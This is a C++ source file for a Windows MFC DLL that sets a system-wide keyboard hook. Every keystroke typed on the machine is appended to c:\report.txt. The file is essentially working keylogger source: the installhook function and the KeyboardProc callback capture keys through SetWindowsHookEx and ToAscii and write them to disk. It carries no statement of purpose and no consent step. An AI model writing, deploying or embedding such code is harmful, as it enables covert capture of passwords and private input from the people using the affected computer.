// hodll.cpp : Defines the initialization routines for the DLL.
//

#include "stdafx.h"
#include "hodll.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif


#pragma data_seg(".SHARDAT_HODLL")
static HHOOK    g_hHook = NULL;
static FILE*    g_pFile = NULL;
#pragma data_seg()

//	Note!
//
//		If this DLL is dynamically linked against the MFC
//		DLLs, any functions exported from this DLL which
//		call into MFC must have the AFX_MANAGE_STATE macro
//		added at the very beginning of the function.
//
//		For example:
//
//		extern "C" BOOL PASCAL EXPORT ExportedFunction()
//		{
//			AFX_MANAGE_STATE(AfxGetStaticModuleState());
//			// normal function body here
//		}
//
//		It is very important that this macro appear in each
//		function, prior to any calls into MFC.  This means that
//		it must appear as the first statement within the 
//		function, even before any object variable declarations
//		as their constructors may generate calls into the MFC
//		DLL.
//
//		Please see MFC Technical Notes 33 and 58 for additional
//		details.
//

/////////////////////////////////////////////////////////////////////////////
// The one and only CHodllApp object

CHodllApp theApp;

/////////////////////////////////////////////////////////////////////////////
// CHodllApp

BEGIN_MESSAGE_MAP(CHodllApp, CWinApp)
//{{AFX_MSG_MAP(CHodllApp)
// NOTE - the ClassWizard will add and remove mapping macros here.
//    DO NOT EDIT what you see in these blocks of generated code!
//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CHodllApp construction

BOOL CHodllApp::InitInstance ()
{    
    return TRUE;
}
BOOL CHodllApp::ExitInstance ()
{
    return TRUE;
}

CHodllApp::CHodllApp()
{
    // TODO: add construction code here,
    // Place all significant initialization in InitInstance
}

//////////////////////////////////////////////////////////////////////////
LRESULT __declspec(dllexport)__stdcall  
            CALLBACK KeyboardProc( int nCode, 
                                   WPARAM wParam, 
                                   LPARAM lParam);

//////////////////////////////////////////////////////////////////////////
// 
BOOL /*__declspec(dllexport)*/ __stdcall installhook()
{
    AFX_MANAGE_STATE(AfxGetStaticModuleState());
    HINSTANCE hins = AfxGetInstanceHandle();

    g_pFile = fopen("c:\\report.txt","w");
    fclose(g_pFile);
    
    g_hHook = ::SetWindowsHookEx(WH_KEYBOARD,(HOOKPROC)KeyboardProc,hins,0);
    
    return TRUE;
}
BOOL __declspec(dllexport)  UnHook()
{
    
    BOOL unhooked = UnhookWindowsHookEx(g_hHook);
    
    return unhooked;
} 

LRESULT __stdcall  CALLBACK KeyboardProc(
                                                              int nCode, 
                                                              WPARAM wParam, 
                                                              LPARAM lParam)
{
    
    char ch;			
    if (((DWORD)lParam & 0x40000000) &&(HC_ACTION==nCode))
    {		
        if ( (wParam==VK_SPACE)||
             (wParam==VK_RETURN)||
             (wParam>=0x2f ) &&(wParam<=0x100) ) 
        {
            g_pFile = fopen("c:\\report.txt","a+");

            if (wParam==VK_RETURN)
            {
                ch='\n';
                TRACE("\n");
                fwrite(&ch,1,1,g_pFile);
            }
            else
            {
                BYTE ks[256];
                GetKeyboardState(ks);

                WORD w;
                UINT scan = 0;
                ToAscii(wParam,scan,ks,&w,0);
                ch = char(w); 

                fwrite(&ch,1,1,g_pFile);
                TRACE("%c",ch);
            }

            fclose(g_pFile);
        }
        
    }
    
    LRESULT RetVal = CallNextHookEx( g_hHook, nCode, wParam, lParam );	
    
    return  RetVal;
    
}
